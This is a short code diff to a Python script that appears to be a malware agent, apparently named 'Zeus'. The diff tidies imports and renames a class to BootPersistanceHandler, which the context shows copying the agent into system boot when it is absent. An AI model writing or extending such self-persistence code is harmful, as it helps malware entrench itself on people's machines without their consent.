@@ -4,11 +4,7 @@
 # Compile with Python 3 only
 
 # Core imports
-import os
-import os.path
-import platform
 import urllib.request
-
 from threading import Thread
 
 # My imports
@@ -73,7 +69,7 @@ if __name__ == "__main__":
     # Check if agents exists on device, if not - immidiatly copy itself to system boot/run
     isZeusExists = checkIfExists()
     if not isZeusExists:
-        bootHandler = SystemBootHandler()
+        bootHandler = BootPersistanceHandler()
         bootHandler.addSelfToSystemToBoot()
 
     didLoadConfSuccfully = loadConfigurations()
